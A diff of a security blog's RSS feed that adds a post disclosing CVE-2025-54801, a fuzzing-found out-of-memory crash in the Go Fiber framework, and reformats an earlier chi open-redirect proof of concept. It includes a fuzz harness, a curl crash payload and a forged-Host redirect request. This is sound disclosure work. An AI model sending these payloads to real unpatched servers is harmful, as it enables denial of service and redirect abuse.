@@ -5,8 +5,180 @@
         <description>Recent content in Posts on Bayesian Blogs</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sun, 29 Jun 2025 09:11:02 -0700</lastBuildDate>
+        <lastBuildDate>Tue, 29 Jul 2025 19:43:13 -0700</lastBuildDate>
         <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Crashing Fiber via go-fuzz</title>
+            <link>http://localhost:1313/posts/cve-2025-54801/</link>
+            <pubDate>Tue, 29 Jul 2025 19:43:13 -0700</pubDate>
+            
+            <guid>http://localhost:1313/posts/cve-2025-54801/</guid>
+            <description>&lt;p&gt;For the past couple months (albeit very sporadically), I have been getting my feet wet in the world of fuzzing. I have been alluding to &amp;ldquo;fuzzing experiments&amp;rdquo; in my recent blogs - and I am happy to state that my experiments have yielded a result! I found an exploitable crash in the &lt;a href=&#34;https://github.com/gofiber/fiber&#34;&gt;Fiber&lt;/a&gt; framework. When using Fiber&amp;rsquo;s &lt;code&gt;Ctx.BodyParser&lt;/code&gt; to parse form data containing a large numeric key that represents a slice index (e.g., &lt;code&gt;test.18446744073704&lt;/code&gt;), the application crashes due to an out-of-bounds slice allocation in the underlying schema decoder. This issue was discovered in Fiber v2.52.8 and has been fixed in v2.52.9. It has been assigned &lt;a href=&#34;https://github.com/gofiber/fiber/security/advisories/GHSA-qx2q-88mx-vhg7&#34;&gt;CVE-2025-54801&lt;/a&gt;&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<p>For the past couple months (albeit very sporadically), I have been getting my feet wet in the world of fuzzing. I have been alluding to &ldquo;fuzzing experiments&rdquo; in my recent blogs - and I am happy to state that my experiments have yielded a result! I found an exploitable crash in the <a href="https://github.com/gofiber/fiber">Fiber</a> framework. When using Fiber&rsquo;s <code>Ctx.BodyParser</code> to parse form data containing a large numeric key that represents a slice index (e.g., <code>test.18446744073704</code>), the application crashes due to an out-of-bounds slice allocation in the underlying schema decoder. This issue was discovered in Fiber v2.52.8 and has been fixed in v2.52.9. It has been assigned <a href="https://github.com/gofiber/fiber/security/advisories/GHSA-qx2q-88mx-vhg7">CVE-2025-54801</a></p>
+<h2 id="background">Background</h2>
+<p>I started experimenting with fuzzing earlier this year, around March - April. I first started with the &ldquo;traditional&rdquo; fuzzing route - fuzzing a binary using AFL++. Getting started was not too difficult. I found a lot of resources on how to set up AFL++ for macOS. At that time I was still using a Macbook with an Intel chip - so I don&rsquo;t know if I would have encountered additional challenges on Apple Silicon - but on my Macbook, setting up AFL++ was fairly straigtforward. Infact, I just got it off <a href="https://formulae.brew.sh/formula/afl++">brew</a>. Understanding basic usage of AFL++ was also not too difficult. Along the way, I learnt a little bit about <code>Make</code> and <code>CMake</code>, and built many binaries.</p>
+<p>What I realized though is:</p>
+<ol>
+<li>I did not understand how to develop fuzzing harnesses. I tried using ChatGPT to write them for me - but did not achieve much success. This was primarily because I was trying to get AI to do something I did not how to do - and therefore I could not explain to it what I wanted or what was going wrong.</li>
+<li>Even when I found a crash, I was not able to dive deeper into it due to my limited understanding of assembly or limted experience with using <code>llvm</code> or <code>gdb</code>.</li>
+</ol>
+<p>Due to these challenges, fuzzing binaries using AFL++ proved to be much more challenging than I had anticipated. This is a skill I definitely wish to pick up but for the time being it will have to wait.</p>
+<h2 id="enter-go-fuzzing">Enter Go Fuzzing</h2>
+<p>Sometime later, while looking at something completely unrelated, I discovered that Go provides a <a href="https://go.dev/doc/security/fuzz/">fuzzing framework</a>. They also provide a <a href="https://go.dev/doc/tutorial/fuzz">tutorial</a> for it - which is fairly easy to follow. I experimented with this (i.e. did the tutorial) and found that it was much more intuitive to me than fuzzing binaries.</p>
+<p>My next step was to find a target I could fuzz. My initial plan was to look at Go itself. I work with a lot of Go CVEs at my job - so naturally I wanted to find a CVE in Go. My thought process was:</p>
+<ol>
+<li>Look at existing CVEs in Go using the <a href="https://pkg.go.dev/vuln/">Go Vulnerability Database</a>.</li>
+<li>Determine if any of these types were found by fuzzing (eg: file parsing issues, out of memory errors, etc).
+<ol>
+<li>This required looking for a disclosure report of the CVE that had at least a proof-of-concept or some technical details about the vulnerability.</li>
+</ol>
+</li>
+<li>Pick one or two of the standard packages where such CVEs exist.</li>
+<li>Fuzz</li>
+</ol>
+<p>Step 2.1 proved to be more involved than I anticipated. I did not find technical information on the CVEs that explained how they were discovered or provided payloads that could trigger the issue. Again, if I looked long enough, I probably would have found a few technical reports for these CVEs, but I did not. I could look for interesting functionality in Go standard packages directly too - but Go has a lot of standard packages - and I don&rsquo;t write Go code - so I did not know where to begin looking.</p>
+<p>Instead, I looked into CVEs in open source projects. A lot of open source projects accept reports through Github - and many a times the advisory contains the complete original report. So my revised steps were:</p>
+<ol>
+<li>Look at CVEs in Go vulnerability database.</li>
+<li>Determine if any of these vulnerabilities had associated advisories on Github that contained the complete report.</li>
+<li>If they did, determine if a similar outcome can be achieved through fuzzing.</li>
+<li>If yes, fuzz the relevant components of the project.</li>
+</ol>
+<p>Soon enough, I found this <a href="https://github.com/gofiber/fiber/security/advisories/GHSA-hg3g-gphw-5hhm">advisory</a> for Fiber which described a crash in <code>Ctx.BodyParser</code>. The setup was pretty simple:</p>
+<ol>
+<li>Create a server using Fiber.</li>
+<li>Send it malformed data.</li>
+<li>The server panics when provided certain crafted inputs which leads to a crash.</li>
+</ol>
+<p>This is <em>very</em> fuzzable. I just need to create a server and then run a fuzzer to bombard the server with all kinds of weird input.</p>
+<h2 id="fuzzing-fiber">Fuzzing Fiber</h2>
+<p>From the README:</p>
+<blockquote>
+<p>Fiber is an Express inspired web framework built on top of Fasthttp, the fastest HTTP engine for Go. Designed to ease things up for fast development with zero memory allocation and performance in mind.</p></blockquote>
+<p>It seems to be a pretty popular framework - as shown by the 1.8k forks and 37.3k stars.</p>
+<p>I started the fuzzing experiment using Go&rsquo;s provided fuzzing framework. Running it a couple times, I had one main complaint - it stopped every time the program crashed. I wanted to keep it running for a long time and collect all the crashes like AFL++ does. I tried using ChatGPT to wrestle with this design and eventually I gave up.</p>
+<p>Next, I tried <a href="https://github.com/dvyukov/go-fuzz">go-fuzz</a> which is an open source Go fuzzing framework. The downside of this is that it is not maintained. My guess is that this was developed before Go supported fuzzing natively and then abandoned when Go added inbuilt support for fuzzing. Anyway, this worked much better for my exploration.</p>
+<p>I created a simple server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Go" data-lang="Go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net/http&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/gofiber/fiber/v2&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">RequestBody</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">NestedContent</span> []<span style="color:#f92672">*</span><span style="color:#66d9ef">struct</span>{} <span style="color:#e6db74">`form:&#34;test&#34;`</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">app</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fiber</span>.<span style="color:#a6e22e">New</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">Post</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">fiber</span>.<span style="color:#a6e22e">Ctx</span>) <span style="color:#66d9ef">error</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">formData</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">RequestBody</span>{}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">BodyParser</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">formData</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">SendStatus</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusUnprocessableEntity</span>)
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>	})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">Listen</span>(<span style="color:#e6db74">&#34;:3000&#34;</span>))
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And a simple fuzzing harness</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Go" data-lang="Go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">fuzz</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/gofiber/fiber/v2&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/valyala/fasthttp&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">RequestBody</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">NestedContent</span> []<span style="color:#f92672">*</span><span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Value</span> <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`form:&#34;value&#34;`</span>
+</span></span><span style="display:flex;"><span>	} <span style="color:#e6db74">`form:&#34;nested-content&#34;`</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">fiber</span>.<span style="color:#a6e22e">App</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">init</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">app</span> = <span style="color:#a6e22e">fiber</span>.<span style="color:#a6e22e">New</span>()
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">fuzzParse</span>(<span style="color:#a6e22e">contentType</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">data</span> []<span style="color:#66d9ef">byte</span>) <span style="color:#66d9ef">error</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fctx</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">fasthttp</span>.<span style="color:#a6e22e">RequestCtx</span>{}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">c</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">AcquireCtx</span>(<span style="color:#a6e22e">fctx</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">ReleaseCtx</span>(<span style="color:#a6e22e">c</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Request</span>().<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">SetContentType</span>(<span style="color:#a6e22e">contentType</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Request</span>().<span style="color:#a6e22e">SetBody</span>(<span style="color:#a6e22e">data</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">parsed</span> <span style="color:#a6e22e">RequestBody</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">BodyParser</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">parsed</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Fuzz</span>(<span style="color:#a6e22e">data</span> []<span style="color:#66d9ef">byte</span>) <span style="color:#66d9ef">int</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Try JSON parsing</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fuzzParse</span>(<span style="color:#e6db74">&#34;application/json&#34;</span>, <span style="color:#a6e22e">data</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Try form parsing</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fuzzParse</span>(<span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>, <span style="color:#a6e22e">data</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And let <code>go-fuzz</code> do its thing.</p>
+<p>Eventually, <code>go-fuzz</code> found a few crashes. Some of them had the input format like <code>NeſTED-content.18446744073704</code>. A similar crash was also discovered by Go&rsquo;s inbuilt fuzzer previously. The key difference (and this may be a result of my harness) was that for the crash found by <code>go-fuzz</code> the error was</p>
+<pre tabindex="0"><code>runtime: out of memory: cannot allocate 147573956411392-byte block (3866624 in use)
+fatal error: out of memory
+</code></pre><p>while for Go&rsquo;s inbuilt fuzzer, it just said <code>killed</code>.</p>
+<p>Reviewing the two crashes, I believe this was because of the <code>go-fuzz</code> request also having <code>Content-Type: application/x-www-form-urlencoded</code>. So in short, I could have saved a lot of time if I wrote my original harness for Go&rsquo;s inbuilt fuzzer to include the content type. Oh well, you live and you learn.</p>
+<p>Anyway, the curl for a request that causes the crash is</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -v -X POST localhost:3000 --data-raw <span style="color:#e6db74">&#39;test.18446744073704&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span>
+</span></span></code></pre></div><p>Sending this payload to a server running Fiber v2.52.8 and below will crash the server due to an out of memory error.</p>
+<h3 id="root-cause-analysis">Root Cause Analysis</h3>
+<p>The root cause of this issue lies within the decoder&rsquo;s <a href="https://github.com/gofiber/fiber/blob/v2.52.8/internal/schema/decoder.go#L249">decode method</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">idx</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">parts</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">index</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">IsNil</span>() <span style="color:#f92672">||</span> <span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">Len</span>() &lt; <span style="color:#a6e22e">idx</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">value</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">reflect</span>.<span style="color:#a6e22e">MakeSlice</span>(<span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">idx</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">idx</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)  <span style="color:#75715e">// &lt;-- Panic/crash occurs here when idx is huge</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">Len</span>() &lt; <span style="color:#a6e22e">idx</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reflect</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">value</span>, <span style="color:#a6e22e">v</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">Set</span>(<span style="color:#a6e22e">value</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The <code>idx</code> variable is not validated before use, leading to unsafe slice allocation for extremely large values. If the value is large enough, the process crashes due to an out of memory error.</p>
+<h3 id="cvss-v4-score">CVSS v4 score</h3>
+<p>Base Score: 8.7 / High
+<a href="https://www.first.org/cvss/calculator/4-0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N">CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</a></p>
+<h3 id="fix">Fix</h3>
+<p>This issue has been fixed by this <a href="https://github.com/gofiber/fiber/commit/1c037c4900cf87dd110a69e4f0b542f64ecb84b3">PR</a>. It adds some checks to prevent large index values for parsers. This resolves the issue I reported.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>I have this habit of not sticking to one thing. I like trying new things more than improving my skills in an &ldquo;old&rdquo; thing. This also holds true in my escapades with security research. I am trying to restrict myself to two areas:</p>
+<ol>
+<li>Running free SAST tools</li>
+<li>Go fuzzing</li>
+</ol>
+<p>At the beginning of the year, my goal was to find 5 CVEs in 2025. I have since slightly altered the goal to find 5 vulnerabilities. Sometimes things don&rsquo;t go your way and you don&rsquo;t get a CVE assigned to your finding (see my <a href="https://www.baishya.xyz/posts/ghsa-vrw8-fxc6-2r93/">last blog</a>). So with this one, I am at 3. And would you look at that - I managed to publish 2 blogs in ~ 6 weeks!</p>
+<p>I am attending BlackHat and Defcon again this year. My 2nd BlackHat and 3rd Defcon. This time I have given myself a few challenges to engage with the community. There are 16 in total. I hope to be able to complete them - and then write about them for my next post (primarily to cheat on increasing the count of articles on this blog without doing security research). Thanks for reading, as always.</p>
+<h2 id="timeline">Timeline</h2>
+<ul>
+<li>May 29, 2025: Reported issue to Fiber maintainers through email.</li>
+<li>June 10, 2025: Sent a follow up email asking if my report was reviewed.</li>
+<li>June 12, 2025: Received a response from Fiber security acknowledging the issue.</li>
+<li>June 26, 2025: Requested a CVE once the issue is fixed.</li>
+<li>July 22, 2025: Sent a follow up email asking for an updated regarding fix and CVE assignment.</li>
+<li>July 29, 2025: Tested the issue in Fiber v2.52.9 and found it to be fixed. Sent another email requesting a CVE assignment since issue has been fixed.</li>
+<li>June 30, 2025: Reached out to a Fiber maintainer via Discord.</li>
+<li>June 30, 2025: Received a prompt response from maintainer on Discord. (Maybe I was barking up the wrong tree.)</li>
+<li>August 1, 2025: Drafted the GHSA as recommended by maintainer.</li>
+<li>August 5, 2025: GHSA published, blog published.</li>
+</ul>
+]]></content>
+        </item>
         
         <item>
             <title>I Ran Free SAST Tools on chi and Found a GHSA</title>
@@ -60,55 +232,55 @@
 </span></span></code></pre></div><p>The Host header can be manipulated by a user to be any arbitrary host. This leads to open redirect when using the <code>RedirectSlashes</code> middleware</p>
 <h3 id="poc">PoC</h3>
 <p>Create a simple server which uses the <code>RedirectSlashes</code> middleware</p>
-<pre tabindex="0"><code>package main
-
-import (
-	&#34;fmt&#34;
-	&#34;net/http&#34;
-
-	&#34;github.com/go-chi/chi/v5&#34;
-	&#34;github.com/go-chi/chi/v5/middleware&#34; // Import the middleware package
-)
-
-func main() {
-	// Create a new Chi router
-	r := chi.NewRouter()
-
-	// Use the built-in RedirectSlashes middleware
-	r.Use(middleware.RedirectSlashes) // Use middleware.RedirectSlashes
-
-	// Define a route handler
-	r.Get(&#34;/&#34;, func(w http.ResponseWriter, r *http.Request) {
-		// A simple response
-		w.Write([]byte(&#34;Hello, World!&#34;))
-	})
-
-	// Start the server
-	fmt.Println(&#34;Starting server on :8080&#34;)
-	http.ListenAndServe(&#34;:8080&#34;, r)
-}
-</code></pre><p>Run the server <code>go run main.go</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net/http&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/go-chi/chi/v5&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/go-chi/chi/v5/middleware&#34;</span> <span style="color:#75715e">// Import the middleware package</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Create a new Chi router</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">r</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">chi</span>.<span style="color:#a6e22e">NewRouter</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Use the built-in RedirectSlashes middleware</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Use</span>(<span style="color:#a6e22e">middleware</span>.<span style="color:#a6e22e">RedirectSlashes</span>) <span style="color:#75715e">// Use middleware.RedirectSlashes</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Define a route handler</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// A simple response</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Write</span>([]byte(<span style="color:#e6db74">&#34;Hello, World!&#34;</span>))
+</span></span><span style="display:flex;"><span>	})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Start the server</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Starting server on :8080&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ListenAndServe</span>(<span style="color:#e6db74">&#34;:8080&#34;</span>, <span style="color:#a6e22e">r</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Run the server <code>go run main.go</code></p>
 <p>Once the server is running, send a request that will trigger the <code>RedirectSlashes</code> function with an arbitrary Host header
 <code>curl -iL -H &quot;Host: example.com&quot; http://localhost:8080/test/</code></p>
 <p>Observe that the request will be redirected to example.com</p>
-<pre tabindex="0"><code>curl -L -H &#34;Host: example.com&#34; http://localhost:8080/test/
-
-&lt;!doctype html&gt;
-&lt;html&gt;
-&lt;head&gt;
-    &lt;title&gt;Example Domain&lt;/title&gt;
-
-    &lt;meta charset=&#34;utf-8&#34; /&gt;
-    &lt;meta http-equiv=&#34;Content-type&#34; content=&#34;text/html; charset=utf-8&#34; /&gt;
-    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34; /&gt;
-    &lt;style type=&#34;text/css&#34;&gt;
-    body {
-        background-color: #f0f0f2;
-        margin: 0;
-        padding: 0;
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, &#34;Segoe UI&#34;, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, Helvetica, Arial, sans-serif;
-... snipped ...
-</code></pre><p>Without the host header, the response is returned from the test server</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>curl -L -H &#34;Host: example.com&#34; http://localhost:8080/test/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!doctype html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;Example Domain&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-type&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html; charset=utf-8&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">style</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    body {
+</span></span><span style="display:flex;"><span>        background-color: #f0f0f2;
+</span></span><span style="display:flex;"><span>        margin: 0;
+</span></span><span style="display:flex;"><span>        padding: 0;
+</span></span><span style="display:flex;"><span>        font-family: -apple-system, system-ui, BlinkMacSystemFont, &#34;Segoe UI&#34;, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, Helvetica, Arial, sans-serif;
+</span></span><span style="display:flex;"><span>... snipped ...
+</span></span></code></pre></div><p>Without the host header, the response is returned from the test server</p>
 <pre tabindex="0"><code>curl -L http://localhost:8080/test/
 
 404 page not found
@@ -696,7 +868,7 @@ Could not build url for endpoint &#39;http:///example.com&#39;. Did you mean &#3
 <p>This behavior can be misused to run arbitrary code, by specifying the code as a forward reference. Setting the <code>__anotations__</code> attribute of an object to such a forward reference does the trick.</p>
 <h3 id="code-example-3">Code example</h3>
